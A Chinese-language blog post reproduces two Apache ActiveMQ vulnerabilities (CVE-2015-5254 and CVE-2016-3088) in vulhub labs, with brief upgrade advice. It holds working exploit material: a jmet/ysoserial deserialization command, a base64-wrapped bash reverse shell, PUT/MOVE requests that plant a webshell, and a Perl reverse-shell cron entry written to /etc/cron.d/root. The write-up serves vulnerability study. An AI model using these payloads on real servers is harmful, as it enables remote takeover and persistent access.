---
title: ActiveMQ漏洞复现
author: jh2ng
cover: 'http://image.jh2ing.com/image-20220618154354946.png'
tags:
  - vulhub
categories:
  - 漏洞复现
abbrlink: 12315
date: 2022-06-19 11:08:00
---

### ActiveMQ 反序列化漏洞 (CVE-2015-5254)

#### 漏洞描述

​	Apache ActiveMQ 5.13.0 之前的 5.x 版本安全漏洞，该程序造成的漏洞不限制代理中可以序列化的类。远程攻击者可以制作一个特殊的序列化Java Message Service (JMS) ObjectMessage 对象，利用该漏洞执行任意代码。

#### 影响版本

Apache ActiveMQ 5.x < 5.13.0

#### 环境搭建

均使用vulhub搭建

![image-20220618154315800](http://image.jh2ing.com/image-20220618154315800.png) 

#### 漏洞复现

下载[jmet](https://github.com/matthiaskaiser/jmet)（The Java Message Exploitation Tool），在同一目录下创建`external`文件夹，使用`ysoserial`生成Payload发送到服务器端的61616端口 ，访问web管理页面并读取序列化消息，然后就可以触发漏洞。

> jmet是使用ysoserial生成Payload并发送（ysoserial自带jar，我们不需要重新下载），所以我们需要选择一个可以在ysoserial中使用的gadget，比如ROME 

执行：

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME your-ip 61616
```

![image-20220618142041977](http://image.jh2ing.com/image-20220618142041977.png)

此时，一个名为 event 的队列将被添加到目标 ActiveMQ 中。

可以访问`http://your-ip:8161/admin/browse.jsp?JMSDestination=Event`以查看此队列中的所有消息。

（**登录名/密码：** admin/admin）：

![image-20220618142257550](http://image.jh2ing.com/image-20220618142257550.png)

![image-20220618142337488](http://image.jh2ing.com/image-20220618142337488.png)

单击此消息触发命令执行，这次进入容器`docker-compose exec activemq bash`

可以看到/tmp/success已经创建成功，说明exploit成功：

![image-20220618142545079](http://image.jh2ing.com/image-20220618142545079.png)

反弹shell

```
# bash
bash -i >/dev/tcp/your-ip/23333 0>&1 2>&1
# bash64 编码

YmFzaCAta..........
bash -c {echo,YmFzaCAta..........}|{base64,-d}|{bash,-i}

java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c {echo,YmFzaCAta..........}|{base64,-d}|{bash,-i}" -Yp ROME your-ip 61616
```

![image-20220618145422632](http://image.jh2ing.com/image-20220618145422632.png)

监听端口

![image-20220618145751495](http://image.jh2ing.com/image-20220618145751495.png)

单击消息触发命令执行，成功获取shell

![image-20220618150007572](http://image.jh2ing.com/image-20220618150007572.png)

#### 修复建议

- 升级到最新版

### ActiveMQ 任意文件写入漏洞 (CVE-2016-3088)

#### 漏洞描述

​	2016年4月14日，国外安全研究人员 Simon Zuckerbraun 曝光 Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088），这个漏洞出现在Fileserver应用中，漏洞原理其实很简单，就是fileserver支持写入文件（但不解析JSP），同时支持移动文件（MOVE请求）。因此，我们只需要写入一个文件，然后通过移动请求将其移动到任意位置，从而导致任意文件写入漏洞。

#### 影响版本

Apache ActiveMQ 5.0.0 - 5.13.2

#### 环境搭建

![image-20220618154210761](http://image.jh2ing.com/image-20220618154210761.png)

![image-20220618154354946](http://image.jh2ing.com/image-20220618154354946.png)

#### 漏洞复现

- **WebShell**

Webshell需要写在Admin或者Api应用中，两个应用都需要登录才能访问。

默认的 ActiveMQ 帐户和密码是`admin`. 首先访问`http://your-ip:8161/admin/test/systemProperties.jsp`查看ActiveMQ的绝对路径：

![image-20220618163852843](http://image.jh2ing.com/image-20220618163852843.png)

上传Webshell：

```
PUT /fileserver/test.txt HTTP/1.1
Host: localhost:8161
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 120976

webshell...
```

![image-20220618165457416](http://image.jh2ing.com/image-20220618165457416.png)

然后将其移至`/opt/activemq/webapps/api/s.jsp`Web 目录中的 API 文件夹 ( )：

```
MOVE /fileserver/test.txt HTTP/1.1
Destination: file:///opt/activemq/webapps/api/test.jsp
Host: localhost:8161
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 0
```

![image-20220618170415700](http://image.jh2ing.com/image-20220618170415700.png)

访问 Webshell（需要登录）：

localhost:8161/api/test.jsp

![image-20220618173435993](http://image.jh2ing.com/image-20220618173435993.png)

- **编写crontab，自动化反向shell**

首先上传cron配置文件（注意换行必须是`\n`，不是`\r\n`，否则crontab执行会失败）：

```
PUT /fileserver/test1.txt HTTP/1.1
Host: localhost:8161
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 245

*/1 * * * * root /usr/bin/perl -e 'use  Socket;$i="10.0.0.1";$p=21111;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![image-20220618200435330](http://image.jh2ing.com/image-20220618200435330.png)

将其移至`/etc/cron.d/root`：

```
MOVE /fileserver/test1.txt HTTP/1.1
Destination: file:///etc/cron.d/root
Host: localhost:8161
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 0
```

![image-20220618200755003](http://image.jh2ing.com/image-20220618200755003.png)

等待反向shell：

![image-20220619110431746](http://image.jh2ing.com/image-20220619110431746.png)

>注意：要求 ActiveMQ 以 root 身份运行，否则将无法写入 cron 文件。

#### 漏洞修复

- 升级至 5.14.0 及其以后版本